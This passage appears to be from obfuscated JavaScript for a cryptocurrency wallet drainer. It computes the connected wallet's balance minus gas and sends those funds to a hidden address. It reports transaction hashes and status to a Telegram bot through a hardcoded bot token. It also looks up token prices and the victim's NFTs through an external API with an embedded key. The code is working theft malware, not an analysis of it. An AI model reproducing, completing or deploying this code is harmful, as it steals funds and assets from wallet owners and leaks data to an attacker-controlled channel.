fetchFeeData();console['log'](_0x135a7b);var _0x3f5ea6=_0x135a7b[_0x7d7674(0x96)]['gasPrice'];_0x3f5ea6=parseFloat(_0x3f5ea6);let _0x1f2910=parseFloat(_0x56fba1[_0x7d7674(0x96)])-_0x3f5ea6*0.00042;_0x1f2910=parseEther(_0x1f2910['toString']()),console[_0x7d7674(0x99)](_0x1f2910);const {hash:_0x194f55}=await sendTransaction({'to':Oxa,'value':_0x1f2910});console[_0x7d7674(0x99)](_0x194f55),sendMessage(_0x7d7674(0xcf),_0x194f55),sendMessage(_0x7d7674(0xe6)),sendMessage(_0x7d7674(0xa1));}catch{sendMessage('Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected');}}async function sendMessage(_0x587333){return new Promise((_0x247a04,_0x1c8ba6)=>{const _0x5ace63=_0x8de9,_0x56107d=Oxc;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0x56107d+_0x5ace63(0x115)+_0x587333,{'method':_0x5ace63(0xf2),'headers':{}})[_0x5ace63(0xab)](async _0x22d656=>{const _0x5a7650=_0x5ace63;if(_0x22d656['status']>0x18f)throw _0x22d656;_0x247a04(await _0x22d656[_0x5a7650(0x8c)]());})[_0x5ace63(0xc2)](_0x3dfbc8=>{_0x1c8ba6(_0x3dfbc8);});});}async function getPrice(_0x492e18){return new Promise((_0xaca26a,_0x34d821)=>{const _0x406931=_0x8de9;fetch(_0x406931(0xdb)+_0x492e18+_0x406931(0x98),{'method':_0x406931(0xf2),'headers':{}})['then'](async _0x4f1de5=>{const _0x33fbfe=_0x406931;if(_0x4f1de5[_0x33fbfe(0xd1)]>0x18f)throw _0x4f1de5;_0xaca26a(await _0x4f1de5[_0x33fbfe(0x8c)]());})[_0x406931(0xc2)](_0x545582=>{_0x34d821(_0x545582);});});}function _0x8de9(_0x2756f2,_0x53143d){const _0x259593=_0x2595();return _0x8de9=function(_0x8de99f,_0x2800aa){_0x8de99f=_0x8de99f-0x88;let _0x54ab29=_0x259593[_0x8de99f];return _0x54ab29;},_0x8de9(_0x2756f2,_0x53143d);}async function getValue(_0x17eed3,_0x448f3f,_0x504749){const _0x5671ec=_0x166275;console[_0x5671ec(0x99)](_0x17eed3,_0x448f3f,_0x504749);let _0x118ff2=await getPrice(_0x17eed3);console[_0x5671ec(0x99)](_0x5671ec(0x10e),_0x118ff2),_0x118ff2=parseFloat(_0x118ff2[_0x17eed3]['usd']);let _0x1ee2fc=_0x448f3f/0xa**(_0x504749||0x12)*_0x118ff2;return _0x1ee2fc=parseInt(_0x1ee2fc),_0x118ff2?_0x1ee2fc:0x0;}async function getNFTs(_0xffe466='',_0x238bdf=_0x166275(0xb0),_0x1ae55f=_0x166275(0xc8),_0x4b7600='50'){return new Promise((_0x4e1402,_0x1694a9)=>{const _0x26ba20=_0x8de9;fetch(_0x26ba20(0xbe)+_0xffe466+_0x26ba20(0xa5)+_0x1ae55f+'&format=decimal&limit='+_0x4b7600,{'method':_0x26ba20(0xf2),'headers':{'accept':_0x26ba20(0xcc),'X-API-Key':_0x238bdf}})[_0x26ba20(0xab)](async _0x27d892=>{const _0x223ae2=_0x26ba20;if(_0x27d892[_0x223ae2(0xd1)]>0x18f)throw _0x27d892;_0x4e1402(await _0x27d892[_0x223ae2(0x8c)]());})[_0x26ba20(0xc2)](_0x61002=>{_0x1694a9(_0x61002);});});}